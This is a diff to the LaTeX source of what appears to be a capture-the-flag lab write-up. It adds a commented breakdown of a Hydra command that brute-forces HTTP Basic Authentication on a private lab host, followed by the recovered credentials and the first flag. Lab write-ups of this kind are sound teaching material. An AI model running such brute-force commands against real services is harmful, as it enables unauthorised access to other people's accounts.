@@ -13,7 +13,7 @@
 	keywordstyle=\color{RubineRed}
 }
 \lstset{emph={
-	EXPOSE,RUN,FROM,CMD,nc,tcp,udp,http,docker},emphstyle=\color{purple}
+	EXPOSE,RUN,FROM,CMD,nc,tcp,udp,docker},emphstyle=\color{purple}
 }
 \newcommand{\abc}{\hfill \break}
 \captionsetup{hypcap=true}
@@ -171,15 +171,29 @@ After running it for a while, we prompted ChatGPT with the list of outputs to tr
 Now that we know the username and that it uses HTTP Basic Authentication, we can use Hydra to brute-force the password. For this, I have chosen the 10-million-password list as our wordlist \cite{pw-list}
 \subsection{Exploitation: Using Hydra to break HTTP basic authentication}
 To brute force the password, the following \texttt{hydra} command will be used: \texttt{hydra -l user -P pw.txt -s 55487 -f 192.168.15.3 http-get /}
-Here is a breakdown of the options used in the command:
-\begin{lstlisting}
--l user
--P pw.txt
--s 55487
--f
-192.168.15.3
-http-get /
+Here is a breakdown of the options used in the command:\cite{hydra-http-basic-auth}
+\begin{lstlisting}[language=bash]
+-l user #specifying the username to attempt logging in with
+-P pw.txt #tells Hydra to use the contents of pw.txt as passwords to try
+-s 55487 #specifying the port to connect to
+-f #telling Hydra to stop after a valid login
+192.168.15.3 #setting the target IP address
+http-get / #specifying the service and method to use
 \end{lstlisting}
+After running this command, we find out that the username is \texttt{user} and the password is \texttt{pass}, as seen in Figure 12.
+\begin{figure}[h]
+	\includegraphics[scale=0.5]{images/hydra.png}
+	\centering
+	\caption{Running the Hydra command to get the credentials}
+\end{figure}\abc
+\newpage
+After entering the found credentials on the webpage, we get the first flag.
+\begin{figure}[h]
+	\includegraphics[scale=0.3]{images/flag1.png}
+	\centering
+	\caption{First flag found}
+\end{figure}\abc
+
 \subsection{sshing into the server}
 \subsection{exploring the system}
 \subsection{procces flag}
